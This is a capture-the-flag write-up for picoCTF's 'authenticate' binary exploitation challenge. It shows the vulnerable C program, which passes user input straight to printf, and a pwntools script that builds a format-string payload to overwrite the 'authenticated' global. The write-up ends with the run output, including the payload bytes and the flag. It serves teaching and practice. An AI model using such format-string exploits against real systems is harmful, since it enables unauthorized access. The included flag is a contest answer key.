# authenticate 
Binary Exploitation, 350 points

## Description:
> Can you authenticate to this service and get the flag?

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>

int authenticated = 0;

int flag() {
  char flag[48];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);
  printf("%s", flag);
  return 0;
}

void read_flag() {
  if (!authenticated) {
    printf("Sorry, you are not *authenticated*!\n");
  }
  else {
    printf("Access Granted.\n");
    flag();
  }

}

int main(int argc, char **argv) {

  setvbuf(stdout, NULL, _IONBF, 0);

  char buf[64];
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  
  printf("Would you like to read the flag? (yes/no)\n");

  fgets(buf, sizeof(buf), stdin);
  
  if (strstr(buf, "no") != NULL) {
    printf("Okay, Exiting...\n");
    exit(1);
  }
  else if (strstr(buf, "yes") == NULL) {
    puts("Received Unknown Input:\n");
    printf(buf);
  }
  
  read_flag();

}
```

## Solution:

The program asks us if we want to read the flag. If so, it will only print the flag if we are authenticated. Authentication is controlled by a global variable (`authenticated`), which we will need to modify in order to get the flag. We will do this using a format string attack, since if the input is not "yes" or "no", the program will use "printf" directly on it.

The script:
```python
from pwn import *
import argparse
import os


LOCAL_PATH = "./auth"
REMOTE_PATH = ["2018shell3.picoctf.com", 26336]

def get_process(is_remote = False):
    if is_remote:
        return remote(*REMOTE_PATH)
    else:
        return process(LOCAL_PATH)

def exec_fmt(payload, is_remote = False):
    proc = get_process(is_remote)
    proc.sendlineafter("(yes/no)", payload)
    return proc.recvall()


parser = argparse.ArgumentParser()
parser.add_argument("-r", "--is_remote", help="Connect to remote server?", action="store_true")
args = parser.parse_args()

e = ELF(LOCAL_PATH)
log.info("Address of 'authenticated': {}".format(hex(e.symbols['authenticated'])))

autofmt = FmtStr(exec_fmt)

writes = {e.symbols['authenticated']:   1}
payload = fmtstr_payload(autofmt.offset, writes)
log.info("Payload: {}".format(enhex(payload)))

print exec_fmt(payload, args.is_remote)
```

The output:
```console
root@kali:/media/sf_CTFs/pico/authenticate# python exploit.py -r
[*] '/media/sf_CTFs/pico/authenticate/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Address of 'authenticated': 0x804a04c
[+] Starting local process './auth': pid 994
[+] Receiving all data: Done (100B)
[*] Process './auth' stopped with exit code 0 (pid 994)
[+] Starting local process './auth': pid 997
[+] Receiving all data: Done (101B)
[*] Process './auth' stopped with exit code 0 (pid 997)
[+] Starting local process './auth': pid 1000
[+] Receiving all data: Done (100B)
[*] Process './auth' stopped with exit code 0 (pid 1000)
[+] Starting local process './auth': pid 1003
[+] Receiving all data: Done (96B)
[*] Process './auth' stopped with exit code 0 (pid 1003)
[+] Starting local process './auth': pid 1006
[+] Receiving all data: Done (99B)
[*] Process './auth' stopped with exit code 0 (pid 1006)
[+] Starting local process './auth': pid 1009
[+] Receiving all data: Done (96B)
[*] Process './auth' stopped with exit code 0 (pid 1009)
[+] Starting local process './auth': pid 1012
[+] Receiving all data: Done (101B)
[*] Process './auth' stopped with exit code 0 (pid 1012)
[+] Starting local process './auth': pid 1015
[+] Receiving all data: Done (96B)
[*] Process './auth' stopped with exit code 0 (pid 1015)
[+] Starting local process './auth': pid 1018
[+] Receiving all data: Done (96B)
[*] Process './auth' stopped with exit code 0 (pid 1018)
[+] Starting local process './auth': pid 1021
[+] Receiving all data: Done (96B)
[*] Process './auth' stopped with exit code 0 (pid 1021)
[+] Starting local process './auth': pid 1024
[+] Receiving all data: Done (101B)
[*] Process './auth' stopped with exit code 0 (pid 1024)
[*] Found format string offset: 11
[*] Payload: 4ca004084da004084ea004084fa0040825323431632531312468686e25323535632531322468686e2531332468686e2531342468686e
[+] Opening connection to 2018shell3.picoctf.com on port 26336: Done
[+] Receiving all data: Done (599B)
[*] Closed connection to 2018shell3.picoctf.com port 26336

Received Unknown Input:

L\xa0\x0M\xa0\x0N\xa0\x0O\xa0\x0                                                                                                                                                                                                                                                \xa6                                                                                                                                                                                                                                                              \xa0
Access Granted.
picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_e8337b91}
```


The flag: picoCTF{y0u_4r3_n0w_aUtH3nt1c4t3d_e8337b91}